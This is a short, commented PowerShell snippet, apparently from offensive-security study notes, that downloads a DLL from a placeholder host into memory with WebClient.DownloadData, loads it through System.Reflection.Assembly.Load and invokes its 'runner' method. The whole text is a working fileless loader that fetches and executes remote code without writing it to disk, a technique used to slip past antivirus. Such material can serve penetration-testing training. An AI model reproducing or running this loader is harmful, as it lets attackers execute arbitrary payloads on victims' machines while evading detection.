##ClassLibary1.dll is the compiled dll from class1.cs
##DownloadData method will save DLL as a byte array in memory 
$data = (New-Object System.Net.WebClient).DownloadData('http://IP/ClassLibrary1.dll')

##load assembly
$assem = [System.Reflection.Assembly]::Load($data)
##interact with it using reflection through the GetType and
##GetMethod methods, and  call it through the Invoke method
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)